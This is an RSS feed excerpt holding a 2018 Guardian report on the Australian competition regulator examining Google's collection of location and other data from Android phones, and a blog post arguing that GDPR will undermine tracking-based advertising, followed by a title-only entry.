<title>Australian regulator investigates Google data harvesting from Android phones</title>
<link>https://www.theguardian.com/technology/2018/may/14/australian-regulator-investigates-google-data-harvesting-from-android-phones</link>
<guid isPermaLink="true" >https://www.theguardian.com/technology/2018/may/14/australian-regulator-investigates-google-data-harvesting-from-android-phones</guid>
<description>&lt;p&gt;The Australian Competition and Consumer Commission will investigate reports Google harvests huge amounts of data from &lt;a href=&quot;https://www.theguardian.com/technology/android&quot; data-link-name=&quot;auto-linked-tag&quot; data-component=&quot;auto-linked-tag&quot; class=&quot;u-underline&quot;&gt;Android&lt;/a&gt; phones, including detailed location information, after the software company Oracle revealed Google could be harvesting a gigabyte of data from devices each month.&lt;/p&gt;
&lt;p&gt;Not only does data transfer raise new privacy concerns for the 10 million Android users in Australia but they are also reportedly paying their telco providers to send the data. If it is in the vicinity of the gigabyte a month Oracle estimates, it is likely costing millions.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.theaustralian.com.au/business/media/were-paying-telcos-to-help-google-spy-on-us/news-story/8a9cb4015a52b778ed96911c74c591b1&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;The Australian&lt;/a&gt; revealed that Oracle had made a presentation to the ACCC, which is holding an inquiry into digital platforms. The inquiry was prompted by the concerns of Australian media companies about the impact that Google and Facebook are having on the advertising market.&lt;/p&gt;
&lt;aside class=&quot;element element-rich-link element--thumbnail element-rich-link--not-upgraded&quot; data-component=&quot;rich-link&quot; data-link-name=&quot;rich-link-2 | 1&quot;&gt;
&lt;/aside&gt;&lt;p&gt;According to the Oracle presentation to the ACCC, Android devices send detailed information on searches and what is being viewed. But they can also send precise locations even if location services are turned off, and they do not have a Sim card or apps installed.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.theguardian.com/technology/google&quot; data-link-name=&quot;auto-linked-tag&quot; data-component=&quot;auto-linked-tag&quot; class=&quot;u-underline&quot;&gt;Google&lt;/a&gt; has mapped IP addresses, wifi connection points and mobile towers, which allow it to know where a device is connecting or attempting to connect without using the phone’s location service.&lt;/p&gt;
&lt;p&gt;According to the chairman of the Australian Privacy Foundation, David Vaile, the company initially did this as part of its Street View surveying but it is now kept up-to-date by the huge amount of data that Android device users are routinely sending back.&lt;/p&gt;
&lt;p&gt;Android phones also include barometric devices that can use air pressure to calculate where a person is located in a multistorey building.&lt;/p&gt;
&lt;p&gt;Google argues that the tracking of data is done with the permission of phone users but there is a question over whether there is valid consent.&lt;/p&gt;
&lt;p&gt;The Google privacy policy, under the heading “Data we process when you use Google”, says: “When you search for a restaurant or watch a video on You Tube, for example, we process information about that activity – including information like the video you watched, device IDs, IP addresses, cookie data and location.”&lt;/p&gt;
&lt;p&gt;But it does not explicitly refer to Android devices, just Google services.&lt;/p&gt;
&lt;p&gt;It also says: “When you use Google services we may collect and process information about your actual location.”&lt;/p&gt;
&lt;p&gt;The chairman of the ACCC, Rod Sims, confirmed the regulator had been given a presentation by Oracle and would look into Google’s practices as part of its inquiry into digital platforms.&lt;/p&gt;
&lt;p&gt;“The ACCC met with Oracle and is considering information it has provided about Google services,” Sims said. “We are exploring how much consumers know about the use of location data and are working closely with the privacy commissioner.”&lt;/p&gt;
&lt;aside class=&quot;element element-rich-link element--thumbnail element-rich-link--not-upgraded&quot; data-component=&quot;rich-link&quot; data-link-name=&quot;rich-link-2 | 2&quot;&gt;
&lt;/aside&gt;&lt;p&gt;Vaile said users had to realise that Google and Facebook were in the commercial surveillance business and the heart of their business model was selling services for advertising purposes.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;“They are both extremely good at manipulating the law and they use those legalities,” he said. “Their initial approach is to ignore any potential breaches of privacy and, as we have now seen, when people notice, their approach is to ask for forgiveness.”&lt;/p&gt;
&lt;p&gt;Google had made it clear that it saw its future in artificial intelligence, Vaile said.&lt;/p&gt;
&lt;p&gt;“Google has self-evolving machine-learning algorithms that use this data being sent from Android devices,” he said. “They let them loose on the data and see what they come up with. Yes, they want to improve their services but on a competitive basis they want to consolidate their leadership in AI.”&lt;/p&gt;
&lt;p&gt;Vaile said that while Google had slowly improved in its approach to protecting customer rights, it was still a mosaic – and third-party apps and devices could also be capturing large amounts of data from Android devices.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;In April, Google owner &lt;a href=&quot;https://www.theguardian.com/technology/alphabet&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;Alphabet&lt;/a&gt; reported an &lt;a href=&quot;https://www.theguardian.com/technology/2018/apr/23/google-owner-alphabet-reports-earnings&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;84% rise&lt;/a&gt; in profits for the previous quarter to $9.4bn.&lt;/p&gt;

<title>GDPR will pop the adtech bubble</title>
<link>http://blogs.harvard.edu/doc/2018/05/12/gdpr/</link>
<guid isPermaLink="true" >http://blogs.harvard.edu/doc/2018/05/12/gdpr/</guid>
<description>&lt;p&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;img class=&quot;alignright size-full wp-image-10258&quot; src=&quot;http://blogs.harvard.edu/doc/files/2016/04/bubble-burst.jpg&quot; alt=&quot;&quot; width=&quot;278&quot; height=&quot;249&quot; /&gt;&lt;/span&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;In&lt;/span&gt; &lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/The_Big_Short&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;The Big Short&lt;/em&gt;&lt;/a&gt;,&lt;/span&gt; &lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;investor &lt;a href=&quot;https://en.wikipedia.org/wiki/Michael_Burry&quot;&gt;Michael Burry&lt;/a&gt; says “One hallmark of mania is the rapid rise in the incidence and complexity of fraud.” (Burry&lt;/span&gt; &lt;a href=&quot;https://www.vanityfair.com/news/2010/04/wall-street-excerpt-201004&quot;&gt;shorted the mania- and fraud-filled subprime mortgage market&lt;/a&gt; and made a mint in the process.)&lt;/p&gt;
&lt;p&gt;One would be equally smart to bet against the mania for the tracking-based form of advertising called &lt;em&gt;adtech&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Since &lt;a href=&quot;http://wtk.wsj.com&quot;&gt;tracking people took off&lt;/a&gt; in the late ’00s, adtech has &lt;a href=&quot;https://digiday.com/marketing/just-wanted-organize-mess-oral-history-lumascape/&quot;&gt;grown to become a four-dimensional shell game played by hundreds&lt;/a&gt; (or, if you include &lt;a href=&quot;https://chiefmartec.com/2018/04/marketing-technology-landscape-supergraphic-2018/&quot;&gt;martech, thousands&lt;/a&gt;) of companies, none of which can see the whole mess, or can control the fraud, malware and other forms of bad acting that thrive in the midst of it.&lt;/p&gt;
&lt;p&gt;And that’s on top of the main problem: &lt;strong&gt;tracking people without their knowledge, approval or a court order is just flat-out wrong&lt;/strong&gt;. The fact that it can be done is no excuse. Nor is the monstrous sum of money made by it.&lt;/p&gt;
&lt;p&gt;Without adtech, the EU’s &lt;a href=&quot;https://en.wikipedia.org/wiki/General_Data_Protection_Regulation&quot;&gt;GDPR &lt;/a&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/General_Data_Protection_Regulation&quot;&gt;(General Data Protection Regulation)&lt;/a&gt; would never have happened. But the GDPR did happen, and as a result websites all over the world are suddenly posting notices about their changed privacy policies, use of cookies, and opt-in choices for “relevant” or “interest-based” (translation: tracking-based) advertising. Email lists are doing the same kinds of things.&lt;/p&gt;
&lt;p&gt;“Sunrise day” for &lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;the&lt;/span&gt; GDPR is 25 May. That’s when the EU can start smacking &lt;a href=&quot;https://en.wikipedia.org/wiki/General_Data_Protection_Regulation#Sanctions&quot;&gt;fines&lt;/a&gt; on violators.&lt;/p&gt;
&lt;p&gt;Simply put, your site or service is a violator if it extracts or processes personal data without personal permission. &lt;em&gt;Real&lt;/em&gt; permission, that is. You know, where you specifically say “Hell yeah, I wanna be tracked everywhere.”&lt;/p&gt;
&lt;p&gt;Of course what I just said greatly simplifies what the GDPR actually utters, in bureaucratic legalese. The GDPR is also full of &lt;a href=&quot;https://medium.com/mydata/five-loopholes-in-the-gdpr-367443c4248b&quot;&gt;loopholes&lt;/a&gt; only snakes can thread; but &lt;em&gt;the spirit of the law is clear&lt;/em&gt;, and the snakes will be easy to shame, even if they don’t get fined. (And &lt;a href=&quot;https://ico.org.uk/for-organisations/guide-to-the-general-data-protection-regulation-gdpr/legitimate-interests/what-is-the-legitimate-interests-basis/&quot;&gt;&lt;em&gt;legitimate interest&lt;/em&gt;—an actual loophole in the GDPR&lt;/a&gt;, &lt;a href=&quot;https://pagefair.com/blog/2017/gdpr-legitimate-interest/&quot;&gt;may prove hard to claim&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;Toward the aftermath, the main question is &lt;em&gt;What will be left of advertising—and what it supports—after the adtech bubble pops?&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Answers require knowing the differences between advertising and adtech, which I liken to &lt;a href=&quot;https://medium.com/@dsearls/separating-advertisings-wheat-and-chaff-47858adfcb20&quot;&gt;wheat and chaff&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;First, &lt;strong&gt;advertising&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;
&lt;ol&gt;&lt;li class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;strong&gt;Advertising isn’t personal, and doesn’t have to be&lt;/strong&gt;.&lt;/span&gt; &lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;In fact, knowing it’s not personal is an advantage for advertisers. Consumers don’t wonder what the hell an ad is doing where it is, who put it there, or why.&lt;br /&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Advertising makes brands&lt;/strong&gt;. Nearly all the brands you know were burned into your brain by advertising. In fact the term &lt;em&gt;branding&lt;/em&gt; was borrowed by advertising from the cattle business. (Specifically by Procter and Gamble in the early 1930s.)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Advertising carries &lt;a href=&quot;https://en.wikipedia.org/wiki/Signalling_(economics)&quot;&gt;an economic signal&lt;/a&gt;&lt;/strong&gt;. Meaning that it shows a company can afford to advertise. Tracking-based advertising can’t do that. (For more on this, read &lt;a href=&quot;https://twitter.com/dmarti&quot;&gt;Don Marti&lt;/a&gt;, &lt;a href=&quot;https://digitalcontentnext.org/blog/2015/08/19/wheres-the-signal/&quot;&gt;starting here&lt;/a&gt;.)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Advertising sponsors media, and those paid by media&lt;/strong&gt;. All the big pro sports salaries are paid by advertising that sponsors game broadcasts. For lack of sponsorship, media—especially publishers—are hurting. @WaltMossberg &lt;a href=&quot;http://www.theverge.com/2017/1/18/14304276/walt-mossberg-online-ads-bad-business&quot;&gt;learned why on a conference stage&lt;/a&gt; when an ad agency guy said the agency’s ads wouldn’t sponsor Walt’s new publication, &lt;a href=&quot;https://www.recode.net/&quot;&gt;recode&lt;/a&gt;. Walt: “I asked him if that meant he’d be placing ads on our fledgling site. He said yes, he’d do that for a little while. And then, after the cookies he placed on Recode helped him to track our desirable audience around the web, his agency would begin removing the ads and placing them on cheaper sites our readers also happened to visit. In other words, our quality journalism was, to him, nothing more than a lead generator for target-rich readers, and would ultimately benefit sites that might care less about quality.” With friends like that, who needs enemies?&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Second, &lt;strong&gt;Adtech&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;
&lt;ol&gt;&lt;li&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;strong&gt;Adtech is built to undermine the brand value of all the media it uses&lt;/strong&gt;,&lt;/span&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt; because it cares about eyeballs more than media, and it causes negative associations with brands. Consider this: &lt;em&gt;perhaps a $trillion or more has been spent on adtech, and not one brand known to the world has been made by it&lt;/em&gt;. (Bob Hoffman, aka &lt;a href=&quot;http://adcontrarian.blogspot.com/&quot;&gt;the Ad Contrarian&lt;/a&gt;, is required reading on this.)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Adtech wants to be personal&lt;/strong&gt;. That’s why it’s tracking-based. Though its enthusiasts call it “interest-based,” “relevant” and other harmless-sounding euphemisms, it relies on tracking people. In fact &lt;em&gt;it can’t exist without tracking people&lt;/em&gt;. (Note: while all adtech is &lt;em&gt;programmatic&lt;/em&gt;, not all programmatic advertising is adtech. In other words, programmatic advertising doesn’t have to be based on tracking people. Same goes for &lt;em&gt;interactive&lt;/em&gt;. Programmatic and interactive advertising will both survive the adtech crash.)&lt;/li&gt;
&lt;li class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;strong&gt;Adtech&lt;/strong&gt; &lt;a class=&quot;markup--anchor markup--p-anchor&quot; href=&quot;http://bit.ly/2mDBPLo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;spies on people and violates their privacy&lt;/strong&gt;&lt;/a&gt;. By design. Never mind that you and your browser or app are anonymized. The ads are still for your eyeballs, and correlations can be made.&lt;br /&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;strong&gt;Adtech is &lt;a class=&quot;markup--anchor markup--p-anchor&quot; href=&quot;https://www.slideshare.net/augustinefou/presentations&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;full of fraud&lt;/a&gt; and &lt;a class=&quot;markup--anchor markup--p-anchor&quot; href=&quot;https://www.google.com/search?&amp;amp;q=adtech+malware&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;a vector for malware&lt;/a&gt;&lt;/strong&gt;. &lt;a href=&quot;https://twitter.com/acfou&quot;&gt;@ACFou&lt;/a&gt; is required reading on this.&lt;br /&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;strong&gt;Adtech &lt;a class=&quot;markup--anchor markup--p-anchor&quot; href=&quot;http://bit.ly/trvtsg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;incentivizes publications to prioritize “content generation” over journalism&lt;/a&gt;&lt;/strong&gt;. More &lt;a href=&quot;http://bit.ly/pr0bcnt&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://medium.com/the-graph/how-to-reverse-publisher-revenue-drain-c33e41bf0665&quot;&gt;here&lt;/a&gt;.&lt;br /&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Intermediators take most of what’s spent on adtech&lt;/strong&gt;. Bob Hoffman does a great job showing how &lt;a href=&quot;http://adcontrarian.blogspot.co.uk/2017/01/display-ads-my-3-worth.html&quot;&gt;as little as 3¢ of a dollar spent on adtech actually makes an “impression&lt;/a&gt;. The most generous number I’ve seen is 12¢. (When I was in the ad agency business, back in the last millennium, clients complained about our 15% take. Media our clients bought got 85%.)&lt;/li&gt;
&lt;li class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;strong&gt;Adtech &lt;a class=&quot;markup--anchor markup--p-anchor&quot; href=&quot;http://www.latimes.com/business/technology/la-fi-tn-fake-news-ad-economy-20161208-story.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gives fake news a business model&lt;/a&gt;&lt;/strong&gt;, because &lt;a class=&quot;markup--anchor markup--p-anchor&quot; href=&quot;https://www.wired.com/2017/02/veles-macedonia-fake-news/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;fake news is easier to produce than the real kind, and adtech will pay anybody a bounty for hauling in eyeballs&lt;/a&gt;.&lt;/span&gt;&lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Adtech incentivizes &lt;a href=&quot;https://www.theguardian.com/world/2018/apr/03/revealed-facebook-hate-speech-exploded-in-myanmar-during-rohingya-crisis&quot;&gt;hate speech and tribalism&lt;/a&gt;&lt;/strong&gt; by giving both—and the platforms that host them—a business model too.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Adtech relies on &lt;a href=&quot;https://en.wikipedia.org/wiki/Misdirection_(magic)&quot;&gt;misdirection&lt;/a&gt;&lt;/strong&gt;. See, adtech &lt;em&gt;looks like&lt;/em&gt; advertising, and i&lt;em&gt;s called&lt;/em&gt; advertising; but it’s really &lt;a href=&quot;https://en.wikipedia.org/wiki/Direct_marketing&quot;&gt;direct marketing&lt;/a&gt;, which is descended from junk mail and a cousin of spam. &lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;Because of that misdirection,&lt;/span&gt; &lt;span class=&quot;markup--quote markup--p-quote is-other&quot;&gt;brands think they’re placing ads in media, while the systems they hire are actually chasing eyeballs&lt;/span&gt; to anywhere. (Pro tip: if somebody says every ad needs to “perform,” or that the purpose of advertising is “to get the right message to the right person at the right time,” they’re actually talking about direct marketing, not advertising. For more on this, read &lt;a href=&quot;https://medium.com/@dsearls/rethinking-john-wanamaker-3f9cfac3ea03&quot;&gt;Rethinking John Wanamaker&lt;/a&gt;.)&lt;/li&gt;
&lt;li&gt;Compared to advertising, &lt;strong&gt;adtech is ugly&lt;/strong&gt;. &lt;a class=&quot;markup--anchor markup--blockquote-anchor&quot; href=&quot;https://duckduckgo.com/?q=Best+ads+of+all+time&amp;amp;ia=&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noopener noopener&quot;&gt;&lt;em class=&quot;markup--em markup--blockquote-em&quot;&gt;Look up &lt;/em&gt;best ads of all time&lt;/a&gt;. One of the top results is for the American Advertising Awards. The latest winners they’ve posted are the &lt;a href=&quot;http://winners.americanadvertisingawards.com/awards2016/best-of-show/&quot;&gt;Best in Show for 2016&lt;/a&gt;. Tops there is an Allstate “Interactive/Online” ad pranking a couple at a ball game. Over-exposure of their lives online leads that well-branded “Mayhem” guy to invade and trash their house. In other words, it’s &lt;em&gt;a brand ad about online surveillance&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Adtech has caused the largest boycott in human history&lt;/strong&gt;. By more than a year ago, &lt;a href=&quot;https://medium.com/the-graph/how-to-reverse-publisher-revenue-drain-c33e41bf0665&quot;&gt;1.7+ billion human beings were already blocking ads online&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;To get a sense of what will be left of adtech after GDPR Sunrise Day, start by reading a pair of articles in &lt;a href=&quot;https://adexchanger.com/&quot;&gt;&lt;em&gt;AdExchanger&lt;/em&gt;&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/JamesHercher&quot;&gt;@JamesHercher&lt;/a&gt;. &lt;a href=&quot;https://adexchanger.com/online-advertising/iab-europe-and-iab-tech-lab-go-live-with-gdpr-consent-framework/&quot;&gt;The first&lt;/a&gt; reports on the &lt;a href=&quot;http://advertisingconsent.eu/&quot;&gt;Transparency and Consent Framework&lt;/a&gt; published by &lt;a href=&quot;https://www.iabeurope.eu/&quot;&gt;IAB Europe&lt;/a&gt;. &lt;a href=&quot;https://adexchanger.com/online-advertising/googles-gdpr-consent-tool-will-limit-publishers-to-12-ad-tech-vendors/&quot;&gt;The second&lt;/a&gt; reports on how Google is pretty much ignoring that framework and going direct with their own way of obtaining consent to tracking:&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;Google’s and other consent-gathering solutions are basically a series of pop-up notifications that provide a mechanism for publishers to provide clear disclosure and consent in accordance with data regulations.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Specifically,&lt;/p&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;The Google consent interface greets site visitors with a request to use data to tailor advertising, with equally prominent “no” and “yes” buttons. If a reader declines to be tracked, he or she sees a notice saying the ads will be less relevant and asking to “agree” or go back to the previous page. According to a source, one research study on this type of opt-out mechanism led to opt-out rates of more than 70%.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Meaning only 30% of site visitors will consent to being tracked. So, say goodbye to 70% of adtech’s eyeball targets right there.&lt;/p&gt;
&lt;p&gt;Google’s consent gathering system, dubbed “Funding Choices,” also screws most of the hundreds of other adtech intermediaries fighting for a hunk of what’s left of their market. Writes James, “It restricts the number of supply chain partners a publisher can share consent with to just 12 vendors, sources with knowledge of the product tell AdExchanger.”&lt;/p&gt;
&lt;p&gt;And that’s not all:&lt;/p&gt;
&lt;blockquote readability=&quot;17.862992125984&quot;&gt;
&lt;p&gt;Last week, Google alerted advertisers it would sharply limit &lt;a href=&quot;https://adexchanger.com/platforms/google-sharply-limits-doubleclick-id-use-citing-gdpr/&quot;&gt;use of the DoubleClick advertising ID,&lt;/a&gt; which brands and agencies used to pull log files from DoubleClick so campaigns could be cohesively measured across other ad servers, incentivizing buyers to consolidate spend on the Google stack.&lt;/p&gt;
&lt;p&gt;Google also raised eyebrows last month with a new policy insisting that all DFP publishers grant it status as a data controller, giving Google the right to collect and use site data, whereas other online tech companies – mere data processors – can only receive limited data assigned to them by the publisher, i.e., the data controller.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is also Google’s way of &lt;a href=&quot;https://digitalcontentnext.org/blog/2018/04/12/google-to-publishers-on-gdpr-take-it-or-leave-it/&quot;&gt;scraping off GDPR liability on publishers&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Publishers and adtech intermediaries can attempt to avoid Google by using Consent Management Platforms (CMPs), a new category of intermediary defined and described by IAB Europe’s &lt;a href=&quot;http://advertisingconsent.eu/&quot;&gt;Consent Management Framework&lt;/a&gt;. Writes James,&lt;/p&gt;
&lt;blockquote readability=&quot;30.76417419885&quot;&gt;
&lt;p&gt;The IAB Europe and and &lt;a href=&quot;https://www.iabtechlab.com/&quot;&gt;IAB Tech Lab&lt;/a&gt; framework includes a list of registered vendors that publishers can pass consent to for data-driven advertising. The tech companies pay a one-time fee between $1,000 and $2,000 to join the vendor list, according to executives from three participating companies…Although now that the framework is live, the barriers to adoption are painfully real as well.&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;more-117597&quot;&gt;&lt;/span&gt;The CMP category is pretty bare at the moment, and it may be greeted with suspicion by some publishers.There are eight initial CMPs: two publisher tech companies with roots in ad-blocker solutions, Sourcepoint and Admiral, as well as the ad tech companies Quantcast and Conversant and a few blockchain-based advertising startups…&lt;/p&gt;
&lt;p&gt;Digital Content Next, a trade group representing online news publishers, is advising publishers to reject the framework, which &lt;a href=&quot;https://adexchanger.com/online-advertising/iab-europe-releases-gdpr-standards-passing-consent-ad-tech-buyers/&quot;&gt;CEO Jason Kint said&lt;/a&gt; “doesn’t meet the letter or spirit of GDPR.” Only two publishers have &lt;a href=&quot;https://www.appnexus.com/en/blog/axel-springer-schibsted-iab-framework-4-24-18&quot;&gt;publicly adopted&lt;/a&gt; the Consent and Transparency Framework, but they’re heavy hitters with blue-chip value in the market: Axel Springer, Europe’s largest digital media company, and the 180-year-old Schibsted Media, a respected newspaper publisher in Sweden and Norway.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In other words, good luck with that.&lt;/p&gt;
&lt;p&gt;One big upside for IAB Europe is that its Framework contains open source &lt;a href=&quot;https://github.com/InteractiveAdvertisingBureau/GDPR-Transparency-and-Consent-Framework&quot;&gt;code&lt;/a&gt; and an &lt;a href=&quot;https://github.com/InteractiveAdvertisingBureau/GDPR-Transparency-and-Consent-Framework/blob/master/Consent%20String%20SDK/Transparency%20and%20Consent%20Framework%20Consent%20String%20SDK%20Resources.md&quot;&gt;SDK&lt;/a&gt;. For a full unpacking of what’s there see the &lt;a href=&quot;https://github.com/InteractiveAdvertisingBureau/GDPR-Transparency-and-Consent-Framework/blob/master/Consent%20string%20and%20vendor%20list%20formats%20v1.1%20Final.md#License&quot;&gt;Consent String and Vendor List Format: Transparency &amp;amp; Consent Framework&lt;/a&gt; on GitHub and IAB Europe’s own &lt;a href=&quot;http://advertisingconsent.eu/wp-content/uploads/2018/04/FAQ_Transparency_Consent_Framework_V12_170418.pdf&quot;&gt;FAQ&lt;/a&gt;. More about this shortly.&lt;/p&gt;
&lt;p&gt;Meanwhile, the adtech business surely knows the sky is falling. The main question is how far.&lt;/p&gt;
&lt;p&gt;One possibility is 95% of the way to zero. That outcome is suggested by results &lt;a href=&quot;https://pagefair.com/blog/2017/new-research-how-many-consent-to-tracking/&quot;&gt;published in PageFair&lt;/a&gt; last October by &lt;a href=&quot;https://pagefair.com/drjohnnyryan/&quot;&gt;Dr. Johnny Ryan&lt;/a&gt; (&lt;a href=&quot;https://twitter.com/johnnyryan&quot;&gt;@JohnnyRyan&lt;/a&gt;) there. Here’s the most revealing graphic in the bunch:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-full wp-image-11569&quot; src=&quot;http://blogs.harvard.edu/doc/files/2018/05/pagefair5percentchart.png&quot; alt=&quot;&quot; width=&quot;518&quot; height=&quot;379&quot; srcset=&quot;http://blogs.harvard.edu/doc/files/2018/05/pagefair5percentchart.png 518w, http://blogs.harvard.edu/doc/files/2018/05/pagefair5percentchart-300x219.png 300w, http://blogs.harvard.edu/doc/files/2018/05/pagefair5percentchart-410x300.png 410w&quot; sizes=&quot;(max-width: 518px) 100vw, 518px&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Note that this wasn’t a survey of the general population. It was a survey of ad industry people: “300+ publishers, adtech, brands, and various others…” Pause for a moment and look at that chart again. Nearly all those proffesionals &lt;em&gt;in the business&lt;/em&gt; would not accept what their businesses do to other human beings.&lt;/p&gt;
&lt;p&gt;“However,” Johnny adds, “almost a third believe that users will consent if forced to do so by ‘tracking walls’, that deny access to a website unless a visitor agrees to be tracked. Tracking walls, however, are prohibited under Article 7 of the GDPR…”&lt;/p&gt;
&lt;p&gt;Pretty cynical, no?&lt;/p&gt;
&lt;p&gt;The good news for both advertising and publishing is that neither needs adtech. What’s more, people can signal what they want out of the sites they visit—and from the whole marketplace. In fact the Internet itself was designed for exactly that. The GDPR just made the market a lot more willing to start hearing &lt;a href=&quot;http://cluetrain.com&quot;&gt;clues from customers that have been laying in plain sight&lt;/a&gt; for almost twenty years.&lt;/p&gt;
&lt;p&gt;The first clues that fully matter are the ones we—the individuals they’ve been calling “users,” will deliver. Look for details on that in another post.&lt;/p&gt;
&lt;p&gt;Meanwhile::::&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pro tip #1: don’t bet against Google&lt;/strong&gt;, except maybe in the short term, when sunrise will darken the whole adtech business.&lt;/p&gt;
&lt;p&gt;Instead, bet against companies that stake their lives on tracking people, and doing that without the clear and explicit consent of the tracked. That’s most of the adtech “ecosystem” not called Google or Facebook.&lt;/p&gt;
&lt;p&gt;Google can say it already has consent, and that it is also has &lt;a href=&quot;https://ico.org.uk/for-organisations/guide-to-the-general-data-protection-regulation-gdpr/legitimate-interests/what-is-the-legitimate-interests-basis/&quot;&gt;legitimate interests&lt;/a&gt; in the personal data it harvests from us.&lt;/p&gt;
&lt;p&gt;Google can also live without the tracking. Most of its income comes from AdWords—its search advertising business—which is far more guided by what visitors are searching for than by whatever Google knows about those visitors.&lt;/p&gt;
&lt;p&gt;Google is also also highly trusted, as tech companies go. Its parent, Alphabet, is also increasingly diversified. Facebook, on the other hand, does stake its life on tracking people. (I say more about Facebook’s odds &lt;a href=&quot;https://medium.com/@dsearls/the-human-solution-to-facebooks-machine-produced-problems-also-won-t-work-3364656bc257&quot;&gt;here&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pro tip #2: &lt;em&gt;do&lt;/em&gt; bet on any business working for customers rather than sellers&lt;/strong&gt;. Because signals of personal intent will produce many more positive outcomes in the digital marketplace than surveillance-fed guesswork by sellers ever could, even with the most advanced AI behind it.&lt;/p&gt;
&lt;p&gt;For more on how that will work, read &lt;em&gt;&lt;a href=&quot;http://amzn.to/ntntcon&quot;&gt;The Intention Economy: When Customers Take Charge&lt;/a&gt;.&lt;/em&gt; Six years after Harvard Business Review Press published that book, what it says will start to come true. Thank you, GDPR.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pro tip #3: &lt;em&gt;do&lt;/em&gt; bet on developers building tools that &lt;a href=&quot;https://medium.com/@dsearls/giving-customers-scale-a5f8a29efcdd&quot;&gt;give each of us scale&lt;/a&gt; in dealing with the world’s companies and governments&lt;/strong&gt;, because those are the tools businesses working for customers will rely on to scale up their successes as well.&lt;/p&gt;
&lt;p&gt;What it comes down to is the need for better signaling between customers and companies than can ever be possible in today’s doomed tracking-fed guesswork system. (All the AI and ML in the world won’t be worth much if the whole point of it is to sell us shit.)&lt;/p&gt;
&lt;p&gt;Think about what customers and companies want and need about each other: interests, intentions, competencies, locations, availabilities, reputations—and boundaries.&lt;/p&gt;
&lt;p&gt;When customers can operate both privately and independently, we’ll get far better markets than today’s ethically bankrupt advertising and marketing system could ever give us.&lt;/p&gt;

<title>“But didn&amp;#039;t you write an embedded OS?”</title>

<guid isPermaLink="true" >http://www.tnhh.net/posts/but-didnt-you-write-an-embedded-os.html</guid>
